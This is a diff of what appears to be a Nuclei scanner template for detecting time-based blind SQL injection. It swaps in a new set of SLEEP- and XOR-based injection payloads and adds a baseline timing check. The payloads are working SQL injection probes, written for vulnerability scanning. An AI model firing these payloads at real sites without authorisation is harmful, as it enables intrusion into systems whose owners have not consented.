@@ -2,26 +2,39 @@ id: time-based-sqli
 
 info:
   name: Time-Based Blind SQL Injection
-  author: 25
+  author: 0xKayala
   severity: critical
-  description: Detects time-based blind SQL injection vulnerabilities by measuring response delays.
-  tags: sqli, time-based
+  description: |
+    This Template detects time-based Blind SQL Injection vulnerability
+  tags: time-based-sqli,sqli,dast,blind
 
-requests:
+flow: http(1) && http(2)
+
+http:
   - method: GET
     path:
-        - "{{BaseURL}}"
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration<=7"
+        internal: true
+
+  - raw:
+      - |
+        @timeout: 20s
+        GET / HTTP/1.1
+        Host: {{Hostname}}
 
     payloads:
       injection:
-        - "' AND SLEEP(7)--"
-        - "' OR SLEEP(7)--"
-        - "' AND IF(1=1, SLEEP(7), 0)--"
-        - "' XOR IF(1=1, SLEEP(7), 0) XOR 'Z"
-        - "'; WAITFOR DELAY '0:0:7';--"
-        - "if(now()=sysdate(), SLEEP(7), 0)"
-        - "' AND (SELECT 4800 FROM (SELECT(SLEEP(7)))a)--"
-        - "' AND (SELECT CASE WHEN(1=1) THEN SLEEP(7) ELSE 0 END)--"
+        - "(SELECT(0)FROM(SELECT(SLEEP(7)))a)"
+        - "'XOR(SELECT(0)FROM(SELECT(SLEEP(7)))a)XOR'Z"
+        - "' AND (SELECT 4800 FROM (SELECT(SLEEP(7)))HoBG)--"
+        - "if(now()=sysdate(),SLEEP(7),0)"
+        - "'XOR(if(now()=sysdate(),SLEEP(7),0))XOR'Z"
+        - "'XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(7) ELSE 0 END)XOR'Z"
 
     fuzzing:
       - part: query
@@ -31,8 +44,8 @@ requests:
           - "{{injection}}"
 
     stop-at-first-match: true
-
     matchers:
       - type: dsl
         dsl:
-          - "duration >= 7 && duration <= 15"
+          - "duration>=7 && duration <=16"
+# digest: 4a0a004730450220221817cdddedb8336ddb4afc4476f70da46a0dfb726a703a5e748458ae5bef000221009ebe3675d3fd10bf29161c179bd9b317b01f18643c2f8a6731ed9d89569495cc:922c64590222798bb761d5b6d8e72950
